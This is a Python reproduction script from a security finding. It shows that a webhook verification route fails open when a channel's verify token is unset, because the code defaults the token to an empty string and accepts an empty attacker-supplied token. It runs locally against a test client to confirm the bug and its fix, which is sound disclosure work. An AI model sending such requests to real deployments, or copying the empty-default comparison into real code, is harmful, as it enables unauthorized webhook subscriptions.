"""Reproduction: GET /v1/channels/{name}/webhook fails OPEN when the
channel's {NAME}_VERIFY_TOKEN env var is unset — glc/routes/channels.py::
channel_webhook_verify.

Invariant broken: #2 ("Every action must be checked against the actual
user, tenant, and final arguments.") — a misconfiguration (an absent
secret) is treated as an implicit secret that trivially compares equal
to an empty attacker-supplied token.

Root cause: `expected = os.environ.get(f"{name.upper()}_VERIFY_TOKEN", "")`
defaults to the empty string when unset, and
`hmac.compare_digest(token, expected)` returns True when both sides are
"".

Run (no server needs to be started manually):

    uv run python findings/webhook-verify-fail-open/repro.py

Expected result BEFORE the fix: "RESULT: VULNERABLE" — a GET request
with an empty hub.verify_token completes the subscription handshake
(HTTP 200, echoes the attacker's hub.challenge) for a channel whose
verify token was never configured.

Expected result AFTER the fix: "RESULT: NOT VULNERABLE" — the same
request is rejected (HTTP 403).
"""

from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

_TMP = Path(tempfile.mkdtemp(prefix="glc-repro-webhook-verify-fail-open-"))
os.environ["GLC_CONFIG_DIR"] = str(_TMP)
os.environ["GLC_AUDIT_DB"] = str(_TMP / "audit.sqlite")
os.environ["GLC_PAIRING_DB"] = str(_TMP / "pairings.sqlite")
os.environ["GLC_GATEWAY_DB"] = str(_TMP / "gateway.sqlite")

CHANNEL = "discord"  # a real channel name; picked because it's disabled/
# unconfigured by default in glc/channels.yaml, exactly the situation
# every mock-keys assignment deployment will be in for most of its 14
# channels.
ENV_VAR = f"{CHANNEL.upper()}_VERIFY_TOKEN"
# Be robust against an already-polluted environment: guarantee the
# channel's verify token is genuinely unset for this run.
os.environ.pop(ENV_VAR, None)

from fastapi.testclient import TestClient  # noqa: E402

import glc.main as m  # noqa: E402


def main() -> int:
    with TestClient(m.app) as client:
        print(f"[1] confirming {ENV_VAR} is not set: {ENV_VAR in os.environ!r} (should be False)")
        assert ENV_VAR not in os.environ

        challenge = "pwned-challenge-12345"
        print(
            f"[2] GET /v1/channels/{CHANNEL}/webhook?hub.mode=subscribe&hub.verify_token=&hub.challenge={challenge}"
        )
        r = client.get(
            f"/v1/channels/{CHANNEL}/webhook",
            params={"hub.mode": "subscribe", "hub.verify_token": "", "hub.challenge": challenge},
        )
        print(f"    status: {r.status_code}")
        print(f"    body:   {r.text!r}")

        vulnerable = r.status_code == 200 and r.text == challenge
        print()
        if vulnerable:
            print(
                "RESULT: VULNERABLE - the handshake completed and echoed the attacker's challenge "
                f"for {CHANNEL!r}, a channel whose verify token was never configured."
            )
        else:
            print(f"RESULT: NOT VULNERABLE - the handshake was rejected (status {r.status_code}).")
        return 1 if vulnerable else 0


if __name__ == "__main__":
    sys.exit(main())
